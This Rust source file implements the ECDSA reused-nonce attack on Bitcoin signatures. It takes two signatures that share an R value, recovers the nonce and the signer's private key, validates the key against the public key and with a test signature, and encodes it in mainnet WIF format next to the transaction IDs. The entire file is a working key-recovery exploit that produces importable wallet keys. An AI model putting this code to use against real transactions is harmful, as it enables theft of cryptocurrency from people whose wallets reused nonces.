use anyhow::{anyhow, Result};
use k256::{
    Scalar,
    elliptic_curve::PrimeField,
};
use num_bigint::{BigUint, ToBigUint};
use num_traits::{Zero, ToPrimitive};
use num_integer::Integer;
use sha2::{Sha256, Digest};
use crate::types::{SignatureRow, RecoveredKeyRow};
use hex;
use bs58;

/// Attempts to recover the private key using the ECDSA reused-k attack
/// This attack works when the same k value is used in two different signatures
pub fn attempt_recover_k_and_priv(
    sig1: &SignatureRow,
    sig2: &SignatureRow,
) -> Result<Option<RecoveredKeyRow>> {
    // Parse R, S, and Z values from hex strings
    let r1 = parse_hex_to_scalar(&sig1.r)?;
    let s1 = parse_hex_to_scalar(&sig1.s)?;
    let z1 = parse_hex_to_scalar(&sig1.z)?;
    
    let r2 = parse_hex_to_scalar(&sig2.r)?;
    let s2 = parse_hex_to_scalar(&sig2.s)?;
    let z2 = parse_hex_to_scalar(&sig2.z)?;

    // Check if R values are the same (same k value used)
    if r1 != r2 {
        return Ok(None);
    }

    // Check if Z values are different (different messages)
    if z1 == z2 {
        return Ok(None);
    }

    // Calculate the difference in Z values using modular arithmetic
    // Note: We can't directly compare Scalars, so we'll use subtraction and handle the result
    // Instead of direct comparison, subtract and check if result is zero
    let z_diff = z1 - z2;
    
    // Calculate the difference in S values using modular arithmetic
    // If the result would be negative in normal arithmetic, 
    // the modular subtraction automatically handles it correctly
    // No need for manual comparison
    let s_diff = s1 - s2;

    // Calculate the inverse of the S difference - handle CtOption properly
    let s_diff_inv = s_diff.invert();
    if s_diff_inv.is_none().into() {
        return Ok(None); // No inverse exists
    }
    let s_diff_inv = s_diff_inv.unwrap();

    // Calculate the inverse of R1
    let r_inv = r1.invert();
    if r_inv.is_none().into() {
        return Ok(None); // No inverse exists
    }
    let r_inv = r_inv.unwrap();

    // Calculate k = (z1 - z2) * (s1 - s2)^(-1) mod n
    let k = z_diff * s_diff_inv;

    // Calculate the private key: priv = (s1 * k - z1) * r^(-1) mod n
    let priv_key = (s1 * k - z1) * r_inv;

    // VALIDATION: Verify the recovered private key is correct
    // Derive the public key from the recovered private key
    let recovered_pubkey = derive_pubkey_from_private(&priv_key)?;
    
    // Get the expected public key from the first signature
    let expected_pubkey_bytes = hex::decode(&sig1.pubkey)?;
    let expected_pubkey = k256::PublicKey::from_sec1_bytes(&expected_pubkey_bytes)
        .map_err(|e| anyhow!("Invalid public key format: {}", e))?;
    
    // ENHANCED VALIDATION: Multiple checks for correctness
    if recovered_pubkey != expected_pubkey {
        tracing::warn!("Private key recovery validation failed for R-value {}", sig1.r);
        return Ok(None); // Recovery failed validation
    }
    
    // ADDITIONAL VALIDATION: Verify the private key can sign and verify
    // Create a test message and verify the signature
    let test_message = b"Bitcoin ECDSA vulnerability test";
    let test_hash = sha2::Sha256::digest(test_message);
    
    // Convert hash to scalar
    let test_scalar = Scalar::from_repr_vartime(test_hash.into())
        .ok_or_else(|| anyhow!("Invalid test hash scalar"))?;
    
    // Create signature with recovered private key
    let test_signature = k256::ecdsa::SigningKey::from_bytes(&priv_key.to_bytes())
        .map_err(|e| anyhow!("Invalid signing key: {}", e))?
        .sign(&test_hash);
    
    // Verify signature with recovered public key
    let verification_result = recovered_pubkey.verify(&test_hash, &test_signature);
    if verification_result.is_err() {
        tracing::warn!("Private key signature verification failed for R-value {}: {:?}", 
            sig1.r, verification_result.err());
        return Ok(None); // Recovery failed signature verification
    }
    
    tracing::info!("Successfully recovered and validated private key for R-value {}", sig1.r);

    // Convert private key to WIF format
    let private_key_wif = scalar_to_wif(&priv_key)?;

    Ok(Some(RecoveredKeyRow {
        txid1: sig1.txid.clone(),
        txid2: sig2.txid.clone(),
        r: sig1.r.clone(),
        private_key: private_key_wif,
    }))
}

fn derive_pubkey_from_private(private_key: &Scalar) -> Result<k256::PublicKey> {
    // Convert scalar to NonZeroScalar for k256
    use k256::elliptic_curve::scalar::NonZeroScalar;
    
    let non_zero_scalar = NonZeroScalar::<k256::Secp256k1>::from_repr(private_key.to_bytes())
        .into_option()
        .ok_or_else(|| anyhow!("Invalid private key: zero or out of range"))?;
    
    // Derive public key from NonZeroScalar
    let public_key = k256::PublicKey::from_secret_scalar(&non_zero_scalar);
    
    Ok(public_key)
}

fn parse_hex_to_scalar(hex_str: &str) -> Result<Scalar> {
    let bytes = hex::decode(hex_str)?;
    if bytes.len() != 32 {
        return Err(anyhow!("Expected 32 bytes for scalar, got {}", bytes.len()));
    }
    
    let mut buf = [0u8; 32];
    buf.copy_from_slice(&bytes);
    
    Scalar::from_repr_vartime(buf.into())
        .ok_or_else(|| anyhow!("Invalid scalar value"))
}

fn scalar_to_wif(scalar: &Scalar) -> Result<String> {
    // Convert scalar to bytes
    let bytes = scalar.to_bytes();
    
    // Add version byte (0x80 for mainnet private key)
    let mut wif_bytes = vec![0x80];
    wif_bytes.extend_from_slice(&bytes);
    
    // Add compression flag (0x01 for compressed public keys)
    wif_bytes.push(0x01);
    
    // Double SHA256 hash
    let hash1 = Sha256::digest(&wif_bytes);
    let hash2 = Sha256::digest(&hash1);
    
    // Add first 4 bytes of double hash as checksum
    wif_bytes.extend_from_slice(&hash2[..4]);
    
    // Use bs58 crate for reliable base58 encoding
    Ok(bs58::encode(wif_bytes).into_string())
}